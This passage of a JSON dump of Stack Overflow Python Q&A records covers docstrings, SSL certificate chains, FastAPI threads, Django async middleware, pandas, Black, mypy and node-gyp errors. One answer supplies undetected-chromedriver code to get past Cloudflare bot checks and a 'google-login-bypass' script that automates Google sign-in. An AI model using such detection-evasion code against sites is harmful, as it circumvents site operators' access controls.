low+np.ones_like(base)*i*((high-low)/l_i)\n            vectors.append(vector_dynamic+vector_bias)\n    return np.array(vectors)\n\n\ndef levels(total):\n    '''\n    create a sequence of stritcly increasing numbers summing up to the total.\n    '''\n    l = []\n    sum_l = 0\n    i = 1\n    while sum_l < total:\n        l.append(i)\n        i +=1\n        sum_l = sum(l)\n    i = 0\n    while sum_l > total:\n        l[i] -= 1\n        if l[i] == 0:\n            l.pop(i)\n        else:\n            i += 1\n        if i == len(l):\n            i = 0\n        sum_l = sum(l)\n    return l\n        \nn_rm = R-1 # number of matrix subsections\nm_rm = M//n_rm\nlen_rms = [ M//n_rm for i in range(n_rm)]\nlen_rms[-1] += M%n_rm\nrm_list = []\nfor len_rm in len_rms:\n    # create a matrix with uniform entries with rank 2\n    # out of the vector 'base[i]' and a ones vector.\n    rm_list.append(build_staircase(\n        base = base[i], \n        num_stairs = len_rms[i], \n        low = low,\n        high = high,\n    ))\n\nrm = np.concatenate(rm_list)\nplt.hist(rm.flatten(), bins = 100)\n\nA few examples:\n\n\n\nand now with N = 1000, M = 6000 to empirically demonstrate the nearly asymptotic behavior:\n\n\n\n"
}
{
    "Id": 70863543,
    "PostTypeId": 1,
    "Title": "Can a Python docstring be calculated (f-string or %-expression)?",
    "Body": "Is it possible to have a Python docstring calculated? I have a lot of repetitive things in my docstrings, so I'd like to either use f-strings or a %-style format expression.\nWhen I use an f-string at the place of a docstring\n\nimporting the module invokes the processing\nbut when I check the __doc__ of such a function it is empty\nsphinx barfs when the docstring is an f-string\n\nI do know how to process the docstrings after the import, but that doesn't work for object 'doc' strings which is recognized by sphinx but is not a real __doc__'s of the object.\n",
    "AcceptedAnswerId": 70865657,
    "AcceptedAnswer": "Docstrings in Python must be regular string literals.\nThis is pretty easy to test - the following program does not show the docstring:\nBAR = \"Hello world!\"\n\ndef foo():\n        f\"\"\"This is {BAR}\"\"\"\n        pass\n\nassert foo.__doc__ is None\nhelp(foo)\n\n\nThe Python syntax docs say that the docstring must be a \"string literal\", and the tail end of the f-string reference says they \"cannot be used as docstrings\".\nSo unfortunately you must use the __doc__ attribute.\nHowever, you should be able to use a decorator to read the __doc__ attribute and replace it with whatever you want.\n"
}
{
    "Id": 70987896,
    "PostTypeId": 1,
    "Title": "Why is this task faster in Python than Julia?",
    "Body": "I ran the following code in RStudio:\nexo <- read.csv('exoplanets.csv',TRUE,\",\")\ndf <- data.frame(exo)\n\nranks <- 570\nfiles <- 3198\ndatas <- vector()\n\nfor ( w in 2:files ) {\n    listas <-vector()\n    for ( i in 1:ranks) {\n            name <- as.character(df[i,w])\n            listas <- append (listas, name)\n    }\n    datas <- append (datas, listas)\n}\n\nIt reads a huge NASA CSV file, converts it to a dataframe,\nconverts each element to string, and adds them to a vector.\nRStudio took 4 min and 15 seconds.\nSo I decided to implement the same code in Julia.\nI ran the following in VS Code:\nusing CSV, DataFrames\n\ndf = CSV.read(\"exoplanets.csv\", DataFrame)\n\nfil, col = 570, 3198\narr = []\n\nfor i in 2:fil\n        for j in 1:col\n            push!(arr, string(df[i, j]))\n        end\nend\n\nThe result was good.\nThe Julia code took only 1 minute and 25 seconds!\nThen for pure curiosity I implemented the same code\nthis time in Python to compare.\nI ran the following in VS Code:\nimport numpy as np\nimport pandas as pd\n\nexo = pd.read_csv(\"exoplanets.csv\")\narr = np.array(exo)\n\nfil, col = 570, 3198\nlis = []\n\nfor i in range(1, fil):\n        for j in range(col):\n            lis.append(arr[i][j].astype('str'))\n\nThe result shocked me! Only 35 seconds!!!\nAnd in Spyder from Anaconda only 26 seconds!!!\nAlmost 2 million floats!!!\nIs Julia slower than Python in data analysis?\nCan I improve the Julia code?\n",
    "AcceptedAnswerId": 70988453,
    "AcceptedAnswer": "NOTE: I wrote the below assuming you want the other column order (as in the Python and R examples).  It is more efficient in Julia this way; to make it work equivalently to your original behaviour, permute the logic or your data at the right places (left as an exercise). Bogumi\u0142's anwer does the right thing already.\n\nPut stuff into functions, preallocate where possible, iterate in stride order, use views, and use builtin functions and broadcasting:\nfunction tostringvector(d)\n    r, c = size(d)\n    result = Vector{String}(undef, r*c)\n    v = reshape(result, r, c)\n    for (rcol, dcol) in zip(eachcol(v), eachcol(d))\n        @inbounds rcol .= string.(dcol)\n    end\n    return result\nend\n\nWhich certainly can be optimized harder.\nOr shorter, making use of what DataFrames already provides:\ntostringvector(d) = vec(Matrix(string.(d)))\n\n"
}
{
    "Id": 70977935,
    "PostTypeId": 1,
    "Title": "Why do I receive 'unable to get local issuer certificate (_ssl.c:997)'",
    "Body": "When sending a request to a specific URL I get an SSL error and I am not sure why. First please see the error message I am presented with:\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='dicmedia.korean.go.kr', port=443): Max retries exceeded with url: /multimedia/naver/2016/40000/35000/14470_byeon-gyeong.wav (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:997)')))\n\nI searched unsuccessfully to different Stackoverflow questions for the last two days:\nI already tried:\n\nhttps://github.com/Unbabel/COMET/issues/29 (This seems to be related with an internal update Python received relating to the use of specific SSL certificates (not an expert here)\nDownloading the certificate in question and directly linking to it with verify=\"private/etc/ssl/certs\"\n\nI am honestly at loss why I receive this error. As the error message itself indicates it seems that the server in question could get my local certificates somehow. The script worked until a week before. I did not update Python before then. Right now I use python 3.10.2 downloaded from the official website.\nI don't want to set verify=False as this just skips the verification process and leaves me vulnerable as numerous people already pointed out at different questions. Besides that it really bothers me that I can't resolve the error.\nAny help is much appreciated. See the specific request:\nimport requests\n\ndef request(url):\n    response = requests.get(url, verify=\"/private/etc/ssl/certs\")\n    print(response)\n\nrequest(\"https://dicmedia.korean.go.kr/multimedia/naver/2016/40000/35000/14470_byeon- \ngyeong.wav\")\n\n",
    "AcceptedAnswerId": 70997594,
    "AcceptedAnswer": "After a lot of googling I figured out the solution myself:\nThe problem - so it seems - was not all certificates needed where included in Pythons cacert.pem file. As I indicated in my question above to tackle this I downloaded the certifi module at first. As this didn't work out as well I suppose certifi missed the necessary certificates as well.\nBut I suppose not all certificates in the certificate where missing. As answers to similar questions indicated as well mostly what is missing is not the entire chain, but only the intermediate certificates.\nAfter:\n1. downloading the necessary certificates (see the lock symbol in your browser; if you're on OSX you need to drag and drop the big images of the certificates to your finder or desktop etc.),\n2. converting them to .perm files and bundling them together: cat first_cert.pem second_cert.pem > combined_cert.pem \nand\n3. providing the specific path of the bundled certificates as indicated in my question: verify=\"private/etc/ssl/certs (you may of course choose a different file path).\nmy request got accepted by the server.\nI guess my mistake when trying this solution was that I didn't download the entire chain at first, but only the last certificate.\nI really hope this helps someone else as a point of reference.\nWhat I am still dying to know though, is why the error popped up in the first place. I didn't change my script at all and use it on a regular basis, but suddenly got presented with said error. Was the reason that the server I tried to reach change its certificates?\nApologies if my terminology is incorrect.\n"
}
{
    "Id": 71518406,
    "PostTypeId": 1,
    "Title": "How to bypass cloudflare browser checking selenium Python",
    "Body": "I am trying to access a site using selenium Python.\nBut the site is checking and checking continuously by cloudflare.\nNo other page is coming.\nCheck the screenshot here.\n\nI have tried undetected chrome but it is not working at all.\n",
    "AcceptedAnswerId": 71518481,
    "AcceptedAnswer": "By undetected chrome do you mean undetected chromedriver?:\nAnyways, undetected-chromedriver works for me:\nUndetected chromedriver\nGithub: https://github.com/ultrafunkamsterdam/undetected-chromedriver\npip install undetected-chromedriver\n\nCode that gets a cloudflare protected site:\nimport undetected_chromedriver as uc\ndriver = uc.Chrome(use_subprocess=True)\ndriver.get('https://nowsecure.nl')\n\nMy POV\n\n\n\nQuick setup code that logs into your google account:\nGithub: https://github.com/xtekky/google-login-bypass\nimport undetected_chromedriver as uc\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\n#  ---------- EDIT ----------\nemail = 'email\\n' # replace email\npassword = 'password\\n' # replace password\n#  ---------- EDIT ----------\n\ndriver = uc.Chrome(use_subprocess=True)\nwait = WebDriverWait(driver, 20)\nurl = 'https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button'\ndriver.get(url)\n\n\nwait.until(EC.visibility_of_element_located((By.NAME, 'identifier'))).send_keys(email)\nwait.until(EC.visibility_of_element_located((By.NAME, 'password'))).send_keys(password)\nprint(\"You're in!! enjoy\")\n\n# [ ---------- paste your code here ---------- ]\n\n"
}
{
    "Id": 71010343,
    "PostTypeId": 1,
    "Title": "Cannot load `swrast` and `iris` drivers in Fedora 35",
    "Body": "Essentially, trying to write the following code results in the error below:\nCode\nfrom matplotlib import pyplot as plt\nplt.plot([1,2,3,2,1])\nplt.show()\n\nError\nlibGL error: MESA-LOADER: failed to open iris: /home/xxx/.conda/envs/stat/lib/python3.8/site-packages/pandas/_libs/window/../../../../../libstdc++.so.6: version `GLIBCXX_3.4.29' not found (required by /usr/lib64/dri/iris_dri.so) (search paths /usr/lib64/dri, suffix _dri)\nlibGL error: failed to load driver: iris\nlibGL error: MESA-LOADER: failed to open swrast: /home/xxx/.conda/envs/stat/lib/python3.8/site-packages/pandas/_libs/window/../../../../../libstdc++.so.6: version `GLIBCXX_3.4.29' not found (required by /usr/lib64/dri/swrast_dri.so) (search paths /usr/lib64/dri, suffix _dri)\nlibGL error: failed to load driver: swrast\n\nI found similar errors on StackOverflow but none were what is needed here.\n",
    "AcceptedAnswerId": 71010344,
    "AcceptedAnswer": "Short answer: export LD_PRELOAD=/usr/lib64/libstdc++.so.6\nLong answer:\nThe underlying problem is that we have a piece of software that was built with an older C++ compiler. Part of the compiler is its implementation of libstdc++ which becomes part of the runtime requirements for anything built by the compiler. The software in question has, evidently, brought its own, older implementation of libstdc++ along for the ride, and given its libstdc++ precedence over the system's libstdc++. Typically, this is done via the $LD_LIBRARY_PATH environment variable. Unfortunately, /usr/lib64/dri/swrast_dri.so is a piece of system software built by the native compiler for that system, and it's more recent than the compiler that built the other software in question. The result of this is that the older compiler's libstdc++ gets loaded first, with its older, more limited symbol set. When it then wants to load swrast, this fails because swrast insists on having the level of compiler/runtime with which it was built. The solution to this whole mess is the force the system's (newer) libstdc++ into use and prevent the older libstdc++ from being brought into play. This is achieved via the code snippet export LD_PRELOAD=/usr/lib64/libstdc++.so.6 where we set the preload environment variable.\n"
}
{
    "Id": 70872276,
    "PostTypeId": 1,
    "Title": "FastAPI python: How to run a thread in the background?",
    "Body": "I'm making a server in python using FastAPI, and I want a function that is not related to my API, to run in background every 5 minutes (like checking stuff from an API and printing stuff depending on the response)\nI've tried to make a thread that runs the function start_worker, but it doesn't print anything.\nDoes anyone know how to do so ?\ndef start_worker():\n    print('[main]: starting worker...')\n    my_worker = worker.Worker()\n    my_worker.working_loop() # this function prints \"hello\" every 5 seconds\n\nif __name__ == '__main__':\n    print('[main]: starting...')\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000, reload=True)\n    _worker_thread = Thread(target=start_worker, daemon=False)\n    _worker_thread.start()\n\n",
    "AcceptedAnswerId": 70873984,
    "AcceptedAnswer": "You should start your Thread before calling uvicorn.run, as uvicorn.run is blocking the thread.\nPS: In your question you state that you would like the background task to run every 5 minutes, but in your code you say every 5 seconds. The below examples assume that is the latter you want. If you want it to be executed every 5 minutes instead, then adjust the time to 60 * 5.\nOption 1\nimport time\nimport threading\nfrom fastapi import FastAPI\nimport uvicorn\n\napp = FastAPI()\nclass BackgroundTasks(threading.Thread):\n    def run(self,*args,**kwargs):\n        while True:\n            print('Hello')\n            time.sleep(5)\n  \nif __name__ == '__main__':\n    t = BackgroundTasks()\n    t.start()\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n\nYou could also start your thread using FastAPI's startup event, as long as it is ok to run before the application starts.\n@app.on_event(\"startup\")\nasync def startup_event():\n    t = BackgroundTasks()\n    t.start()\n\nOption 2\nYou could instead use a repeating Event scheduler for the background task, as below:\nimport sched, time\nfrom threading import Thread\nfrom fastapi import FastAPI\nimport uvicorn\n\napp = FastAPI()\ns = sched.scheduler(time.time, time.sleep)\n\ndef print_event(sc): \n    print(\"Hello\")\n    sc.enter(5, 1, print_event, (sc,))\n\ndef start_scheduler():\n    s.enter(5, 1, print_event, (s,))\n    s.run()\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    thread = Thread(target = start_scheduler)\n    thread.start()\n\nif __name__ == '__main__':\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n\n"
}
{
    "Id": 70864474,
    "PostTypeId": 1,
    "Title": "Uvicorn async workers are still working synchronously",
    "Body": "Question in short\nI have migrated my project from Django 2.2 to Django 3.2, and now I want to start using the possibility for asynchronous views. I have created an async view, setup asgi configuration, and run gunicorn with a Uvicorn worker. When swarming this server with 10 users concurrently, they are served synchronously. What do I need to configure in order to serve 10 concurrent users an async view?\nQuestion in detail\nThis is what I did so far in my local environment:\n\nI am working with Django 3.2.10 and Python 3.9.\nI have installed gunicorn and uvicorn through pip\nI have created an asgi.py file with the following contents\n\n    import os\n    from django.core.asgi import get_asgi_application\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'MyService.settings.local')\n    application = get_asgi_application()\n\n\nI have created a view with the following implementation, and connected it in urlpatterns:\n\n    import asyncio\n    import json\n    from django.http import HttpResponse\n    \n    async def async_sleep(request):\n        await asyncio.sleep(1)\n        return HttpResponse(json.dumps({'mode': 'async', 'time': 1).encode())\n\n\nI run locally a gunicorn server with a Uvicorn worker:\n\ngunicorn MyService.asgi:application -k uvicorn.workers.UvicornWorker\n[2022-01-26 14:37:14 +0100] [8732] [INFO] Starting gunicorn 20.1.0\n[2022-01-26 14:37:14 +0100] [8732] [INFO] Listening at: http://127.0.0.1:8000 (8732)\n[2022-01-26 14:37:14 +0100] [8732] [INFO] Using worker: uvicorn.workers.UvicornWorker\n[2022-01-26 14:37:14 +0100] [8733] [INFO] Booting worker with pid: 8733\n[2022-01-26 13:37:15 +0000] [8733] [INFO] Started server process [8733]\n[2022-01-26 13:37:15 +0000] [8733] [INFO] Waiting for application startup.\n[2022-01-26 13:37:15 +0000] [8733] [INFO] ASGI 'lifespan' protocol appears unsupported.\n[2022-01-26 13:37:15 +0000] [8733] [INFO] Application startup complete.\n\n\nI hit the API from a local client once. After 1 second, I get a 200 OK, as expected.\nI set up a locust server to spawn concurrent users. When I let it make requests with 1 concurrent user, every 1 second an API call is completed.\nWhen I let it make requests with 10 concurrent users, every 1 second an API call is completed. All other requests are waiting.\n\nThis last thing is not what I expect. I expect the worker, while sleeping asynchronously, to pick up the next request already. Am I missing some configuration?\nI also tried it by using Daphne instead of Uvicorn, but with the same result.\nLocust\nThis is how I have set up my locust.\n\nStart a new virtualenv\npip install locust\nCreate a locustfile.py with the following content:\n\nfrom locust import HttpUser, task\nclass SleepUser(HttpUser):\n    @task\n    def async_sleep(self):\n        self.client.get('/api/async_sleep/')\n\n\nRun the locust executable from the shell\nVisit http://0.0.0.0:8089 in the browser\nSet number of workers to 10, spawn rate to 1 and host to http://127.0.0.1:8000\n\nMiddleware\nThese are my middleware settings\nMIDDLEWARE = [\n    'django_prometheus.middleware.PrometheusBeforeMiddleware',\n    'corsheaders.middleware.CorsMiddleware',\n    'django.middleware.gzip.GZipMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n    'django.middleware.security.SecurityMiddleware',\n    'shared.common.middleware.ApiLoggerMiddleware',\n    'django_prometheus.middleware.PrometheusAfterMiddleware',\n]\n\nThe ApiLoggerMiddleware from shared is from our own code, I will investigate this one first. This is the implementation of it.\nimport logging\nimport os\nfrom typing import List\n\nfrom django.http import HttpRequest, HttpResponse\nfrom django.utils import timezone\n\nfrom shared.common.authentication_service import BaseAuthenticationService\n\n\nclass ApiLoggerMiddleware:\n    TOO_BIG_FOR_LOG_BYTES = 2 * 1024\n\n    def __init__(self, get_response):\n        # The get_response callable is provided by Django, it is a function\n        # that takes a request and returns a response. Plainly put, once we're\n        # done with the incoming request, we need to pass it along to get the\n        # response which we need to ultimately return.\n        self._get_response = get_response\n        self.logger = logging.getLogger('api')\n        self.pid = os.getpid()\n        self.request_time = None\n        self.response_time = None\n\n    def __call__(self, request: HttpRequest) -> HttpResponse:\n        common_data = self.on_request(request)\n        response = self._get_response(request)\n        self.on_response(response, common_data)\n        return response\n\n    def truncate_body(self, request: HttpRequest) -> str:\n        return f\"{request.body[:self.TOO_BIG_FOR_LOG_BYTES]}\"\n\n    def on_request(self, request: HttpRequest) -> List[str]:\n        self.request_time = timezone.now()\n\n        remote_address = self.get_remote_address(request)\n        user_agent = request.headers.get('User-Agent') or ''\n        customer_uuid = self.get_customer_from_request_auth(request)\n        method = request.method\n        uri = request.get_raw_uri()\n\n        common = [\n            remote_address,\n            user_agent,\n            customer_uuid,\n            method,\n            uri\n        ]\n\n        in_line = [\n                      \"IN\",\n                      str(self.pid),\n                      str(self.request_time),\n                  ] + common + [\n                      self.truncate_body(request)\n                  ]\n\n        self.logger.info(', '.join(in_line))\n        return common\n\n    def on_response(self, response: HttpResponse, common: List[str]) -> None:\n        self.response_time = timezone.now()\n\n        out_line = [\n                       \"OUT\",\n                       str(self.pid),\n                       str(self.response_time)\n                   ] + common + [\n                       str(self.response_time - self.request_time),\n                       str(response.status_code),\n                   ]\n        self.logger.info(\", \".join(out_line))\n\n    @classmethod\n    def get_customer_from_request_auth(cls, request: HttpRequest) -> str:\n        token = request.headers.get('Authorization')\n        if not token:\n            return 'no token'\n        try:\n            payload = BaseAuthenticationService.validate_access_token(token)\n            return payload.get('amsOrganizationId', '')\n        except Exception:\n            return 'unknown'\n\n    @classmethod\n    def get_remote_address(cls, request: HttpRequest) -> str:\n        if 'X-Forwarded-For' in request.headers:\n            # in case the request comes in through a proxy, the remote address\n            # will be just the last proxy that passed it along, that's why we\n            # have to get the remote from X-Forwarded-For\n            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\n            addresses = request.headers['X-Forwarded-For'].split(',')\n            client = addresses[0]\n            return client\n        else:\n            return request.META.get('REMOTE_ADDR', '')\n\nSources\nSources I have used:\n\nA Guide to ASGI in Django 3.0 and its performance\nHow to use Django with Uvicorn\n\n",
    "AcceptedAnswerId": 71023739,
    "AcceptedAnswer": "Your ApiLoggerMiddleware is a synchronous middleware.\nFrom https://docs.djangoproject.com/en/4.0/topics/async/#async-views, emphasis mine:\n\nYou will only get the benefits of a fully-asynchronous request stack if you have no synchronous middleware loaded into your site. If there is a piece of synchronous middleware, then Django must use a thread per request to safely emulate a synchronous environment for it.\nMiddleware can be built to support both sync and async contexts. Some of Django\u2019s middleware is built like this, but not all. To see what middleware Django has to adapt, you can turn on debug logging for the django.request logger and look for log messages about \u201cSynchronous middleware \u2026 adapted\u201d.\n\n(The log message currently says \"Asynchronous middleware ... adapted\", bug reported at #33495.)\nTurn on debug logging for the django.request logger  by adding this to your LOGGING setting:\n'django.request': {\n    'handlers': ['console'],\n    'level': 'DEBUG',\n},\n\nSolution\nTo make ApiLoggerMiddleware asynchronous:\n\nInherit django.utils.deprecation.MiddlewareMixin.\n\ncall super().__init__(get_response) in __init__.\nremove __call__; MiddlewareMixin.__call__ makes your middleware asynchronous.\n\n\nRefactor on_request to process_request.\n\nreturn None instead of common.\nattach common to request instead: request.common = common.\nremember to update references to request.common.\nattach request_time to request instead of self to make it (and the middleware) thread-safe.\nremember to update references to request.request_time.\n\n\nRefactor on_response(self, response, common) to process_response(self, request, response).\n\nreturn response.\ndon't attach response_time to self; leave it as a variable since it's not used in other functions.\n\n\n\nThe result:\nclass ApiLoggerMiddleware(MiddlewareMixin):\n    TOO_BIG_FOR_LOG_BYTES = 2 * 1024\n\n    def __init__(self, get_response):\n        # The get_response callable is provided by Django, it is a function\n        # that takes a request and returns a response. Plainly put, once we're\n        # done with the incoming request, we need to pass it along to get the\n        # response which we need to ultimately return.\n        super().__init__(get_response)  # +\n        self._get_response = get_response\n        self.logger = logging.getLogger('api')\n        self.pid = os.getpid()\n        # self.request_time = None   # -\n        # self.response_time = None  # -\n\n    # def __call__(self, request: HttpRequest) -> HttpResponse:  # -\n    #     common_data = self.on_request(request)                 # -\n    #     response = self._get_response(request)                 # -\n    #     self.on_response(response, common_data)                # -\n    #     return response                                        # -\n\n    def truncate_body(self, request: HttpRequest) -> str:\n        return f\"{request.body[:self.TOO_BIG_FOR_LOG_BYTES]}\"\n\n    # def on_request(self, request: HttpRequest) -> List[str]:  # -\n    def process_request(self, request: HttpRequest) -> None:    # +\n        # self.request_time = timezone.now()   # -\n        request.request_time = timezone.now()  # +\n\n        remote_address = self.get_remote_address(request)\n        user_agent = request.headers.get('User-Agent') or ''\n        customer_uuid = self.get_customer_from_request_auth(request)\n        method = request.method\n        uri = request.get_raw_uri()\n\n        common = [\n            remote_address,\n            user_agent,\n            customer_uuid,\n            method,\n            uri\n        ]\n\n        in_line = [\n            \"IN\",\n            str(self.pid),\n            # str(self.request_time),   # -\n            str(request.request_time),  # +\n        ] + common + [\n            self.truncate_body(request)\n        ]\n\n        self.logger.info(', '.join(in_line))\n        # return common          # -\n        request.common = common  # +\n        return None              # +\n\n    # def on_response(self, response: HttpResponse, common: List[str]) -> None:                # -\n    def process_response(self, request: HttpRequest, response: HttpResponse) -> HttpResponse:  # +\n        # self.response_time = timezone.now()  # -\n        response_time = timezone.now()         # +\n\n        out_line = [\n            \"OUT\",\n            str(self.pid),\n            # str(self.response_time)  # -\n            str(response_time)         # +\n            # ] + common + [                    # -\n        ] + getattr(request, 'common', []) + [  # +\n            # str(self.response_time - self.request_time),             # -\n            str(response_time - getattr(request, 'request_time', 0)),  # +\n            str(response.status_code),\n        ]\n        self.logger.info(\", \".join(out_line))\n        return response  # +\n\n    @classmethod\n    def get_customer_from_request_auth(cls, request: HttpRequest) -> str:\n        token = request.headers.get('Authorization')\n        if not token:\n            return 'no token'\n        try:\n            payload = BaseAuthenticationService.validate_access_token(token)\n            return payload.get('amsOrganizationId', '')\n        except Exception:\n            return 'unknown'\n\n    @classmethod\n    def get_remote_address(cls, request: HttpRequest) -> str:\n        if 'X-Forwarded-For' in request.headers:\n            # in case the request comes in through a proxy, the remote address\n            # will be just the last proxy that passed it along, that's why we\n            # have to get the remote from X-Forwarded-For\n            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\n            addresses = request.headers['X-Forwarded-For'].split(',')\n            client = addresses[0]\n            return client\n        else:\n            return request.META.get('REMOTE_ADDR', '')\n\n"
}
{
    "Id": 70935209,
    "PostTypeId": 1,
    "Title": "how to explode dynamically using pandas column?",
    "Body": "I have a dataframe that looks like this\nimport pandas as pd\nimport numpy as np\n# Create data set.\ndataSet = {'id': ['A', 'A', 'B'],\n           'id_2': [1, 2, 1] ,\n           'number': [320, 169, 120],\n           'add_number' : [4,6,3]}\n\n# Create dataframe with data set and named columns.\ndf = pd.DataFrame(dataSet, columns= ['id', 'id_2','number', 'add_number'])\n\n    id  id_2    number  add_number\n0   A   1        320       4\n1   A   2        169       6\n2   B   1        120       3\n\nI would like use number and add_number so that I can explode this dynamically, ie) 320 + 4 would have [320,321,322,323,324] (up to 324, and would like to explode on this)\nDESIRED OUTPUT\n    id  id_2    number\n0   A   1        320       \n1   A   1        321       \n2   A   1        322\n3   A   1        323\n4   A   1        324\n5   A   2        169\n6   A   2        170\n7   A   2        171\n8   A   2        172\n9   A   2        173\n10  A   2        174\n11  A   2        175\n12  B   1        120\n13  B   1        121\n14  B   1        122\n15  B   1        123\n\nI looked over explode, wide_to_long pandas function, but I do not know where to start, any sense of direction would be appreciated!!\n",
    "AcceptedAnswerId": 70935300,
    "AcceptedAnswer": "You try using np.arange and explode:\ndf['range'] = df.apply(lambda x: np.arange(x['number'], x['number']+x['add_number']+1), axis=1)\ndf.explode('range')\n\nor\ndf['range'] = [np.arange(n, n+a+1) for n, a in zip(df['number'],df['add_number'])] \ndf.explode('range')\n\nOutput:\n  id  id_2  number  add_number range\n0  A     1     320           4   320\n0  A     1     320           4   321\n0  A     1     320           4   322\n0  A     1     320           4   323\n0  A     1     320           4   324\n1  A     2     169           6   169\n1  A     2     169           6   170\n1  A     2     169           6   171\n1  A     2     169           6   172\n1  A     2     169           6   173\n1  A     2     169           6   174\n1  A     2     169           6   175\n2  B     1     120           3   120\n2  B     1     120           3   121\n2  B     1     120           3   122\n2  B     1     120           3   123\n\n"
}
{
    "Id": 70966298,
    "PostTypeId": 1,
    "Title": "Python Black code formatter doesn't format docstring line length",
    "Body": "I am running the Black code formatter against a Python script however it doesn't reformat the line length for docstrings. For example, given the following code:\ndef my_func():\n    \"\"\"\n    This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring.\n    \"\"\"\n    return\n\nWhen running Black against this script, the line length does not change. How can I ensure docstrings get formatted when running Black?\n",
    "AcceptedAnswerId": 71041192,
    "AcceptedAnswer": "maintainer here! :wave:\nThe short answer is no you cannot configure Black to fix line length issues in docstrings currently.\nIt's not likely Black will split or merge lines in docstrings as it would be far too risky, structured data can and does exist in docstrings. While I would hope the added newlines wouldn't break the consumers it's still a valid concern.\nThere's currently an open issue asking for this (although it also wants the line length limit for docstrings and strings to be 79) GH-2289, and specifically for docstrings GH-2865. You can also read GH-1713 which is about splitting comments (and likewise has mixed feelings from maintainers).\nFor the time being, perhaps you can look into https://github.com/PyCQA/docformatter which does seem to wrap docstrings (see the --wrap-descriptions and --wrap-summaries options)\n\nP.S. if you're curious whether we'll add a flag to split docstrings or comments, it's once again unlikely since we seek to minimize formatting configurability. Especially as the pre-existing flags only disable certain elements of Black's style (barring --line-length which exists as there's no real consensus what it should be). Feel free to state your arguments in the linked issues tho!\n"
}
{
    "Id": 70938215,
    "PostTypeId": 1,
    "Title": "Why does mypy flag \"Item None has no attribute x\" error even if I check for None?",
    "Body": "Trying to do Python (3.8.8) with type hinting and getting errors from mypy (0.931) that I can't really understand.\nimport xml.etree.ElementTree as ET\ntree = ET.parse('plant_catalog.xml')  # read in file and parse as XML\nroot = tree.getroot()  # get root node\nfor plant in root:  # loop through children\n    if plant.find(\"LIGHT\") and plant.find(\"LIGHT\").text == \"sun\" \n        print(\"foo\")\n\nThis raises the mypy error Item \"None\" of \"Optional[Element]\" has no attribute \"text\".\nBut why? I do check for the possibility of plant.find(\"LIGHT\") returning None in the first half of the if clause. The second part accessing the .text attribute isn't even executed if the first part fails.\nIf I modify to\n    lights = plant.find(\"LIGHT\")\n    if lights:\n        if lights.text == selection:            \n            print(\"foo\")\n\nthe error is gone.\nSo is this because the plant object might still change in between the first check and the second? But assigning to a variable doesn't automatically copy the content, its still just a reference to an object that might change. So why does it pass the second time?\n(Yes, I know that repeating the .find() twice is also not time-efficient.)\n",
    "AcceptedAnswerId": 70938396,
    "AcceptedAnswer": "mypy doesn't know that plant.find(\"LIGHT\") always returns the same value, so it doesn't know that your test is a proper guard.\nSo you need to assign it to a variable. As far as mypy is concerned, the variable can't change from one object to another without being reassigned, and its contents can't change if you don't perform some other operation on it.\n"
}
{
    "Id": 70669213,
    "PostTypeId": 1,
    "Title": "gyp ERR! stack Error: Command failed: python -c import sys; print \"%s.%s.%s\" % sys.version_info[:3]",
    "Body": "I'm trying to npm install in a Vue project, and even if I just ran vue create (name)\nit gives me this err:\nnpm ERR! gyp verb check python checking for Python executable \"c:\\Python310\\python.exe\" in the PATH\nnpm ERR! gyp verb `which` succeeded c:\\Python310\\python.exe c:\\Python310\\python.exe\nnpm ERR! gyp ERR! configure error\nnpm ERR! gyp ERR! stack Error: Command failed: c:\\Python310\\python.exe -c import sys; print \"%s.%s.%s\" % sys.version_info[:3];\nnpm ERR! gyp ERR! stack   File \"\", line 1\nnpm ERR! gyp ERR! stack     import sys; print \"%s.%s.%s\" % sys.version_info[:3];\nnpm ERR! gyp ERR! stack                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nnpm ERR! gyp ERR! stack SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?\nnpm ERR! gyp ERR! stack\nnpm ERR! gyp ERR! stack     at ChildProcess.exithandler (node:child_process:397:12)\nnpm ERR! gyp ERR! stack     at ChildProcess.emit (node:events:390:28)\nnpm ERR! gyp ERR! stack     at maybeClose (node:internal/child_process:1064:16)\nnpm ERR! gyp ERR! stack     at Process.ChildProcess._handle.onexit (node:internal/child_process:301:5)\nnpm ERR! gyp ERR! System Windows_NT 10.0.19044\nnpm ERR! gyp ERR! command \"C:\\\\Program Files\\\\nodejs\\\\node.exe\" \"C:\\\\Upwork\\\\contact_book\\\\node_modules\\\\node-gyp\\\\bin\\\\node-gyp.js\" \"rebuild\" \"--verbose\" \"--libsass_ext=\" \"--libsass_cflags=\" \"--libsass_ldflags=\" \"--libsass_library=\"\nnpm ERR! gyp ERR! cwd C:\\Upwork\\contact_book\\node_modules\\node-sass\nnpm ERR! gyp ERR! node -v v16.13.1\nnpm ERR! gyp ERR! node-gyp -v v3.8.0\nnpm ERR! gyp ERR! not ok\nnpm ERR! Build failed with error code: 1\n\nI tried it in another PC but it is working fine, I think it is because I need to install something (since the PC is new)\n",
    "AcceptedAnswerId": 70968862,
    "AcceptedAnswer": "As @MehdiMamas pointed out in the comments, downgrading Node to v14 should solve the problem\nnvm install 14\nnvm use 14\n\n"
}
{
    "Id": 71535170,
    "PostTypeId": 1,
